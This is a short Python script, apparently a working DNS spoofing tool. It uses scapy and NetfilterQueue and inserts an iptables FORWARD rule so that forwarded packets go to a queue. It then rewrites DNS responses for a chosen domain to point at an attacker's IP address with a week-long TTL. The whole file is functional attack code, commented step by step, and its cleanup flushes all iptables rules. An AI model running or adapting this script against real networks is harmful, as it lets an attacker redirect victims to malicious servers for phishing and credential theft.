from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

ipAttacker = input('enter IPv4 Address where to redirect: ')
domain_to_spoff = input('enter domain you want to spoof: ')

#Verify if packet is a DNS response and thus modify it, else just accept/forward without modification
def inspect(packet):
	# from payload raw packet's to scapy packet
	pkt = IP(packet.get_payload())
	#if the packet is a DNS packet
	if(DNS in pkt):
	# And if the domain = domain_to_spoff and DNS is a answer packet (has a DNSRR layer)
		if(domain_to_spoff.lower() in str(pkt[DNS].qd.qname) and pkt.haslayer(DNSRR)):
		# pass to the spoof function
			pkt = spoof(pkt)
		# put back raw version of modified packet on payload
			packet.set_payload(bytes(pkt))
	# forward
	packet.accept()

def spoof(pkt):
	#change the answer section to redirect domain_to_spoff to desired address
	pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=604800, rdata=ipAttacker)
	# set the answer count to 1
	pkt[DNS].ancount = 1
	# modifying the packet will change its checksums and lenght
	# we simply delete those field for IP and UDP
	# scapy will recalculate new proper values automaticaly when calling bytes()
	del pkt[IP].chksum
	del pkt[UDP].chksum
	del pkt[IP].len
	del pkt[UDP].len

	return pkt

# we need an iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

nfqueue = NetfilterQueue()
nfqueue.bind(0, inspect)

try:
	nfqueue.run()
except KeyboardInterrupt:
	# we need to clean the iptables rules else, shen done, we will stop forwarding
	os.system("iptables --flush")
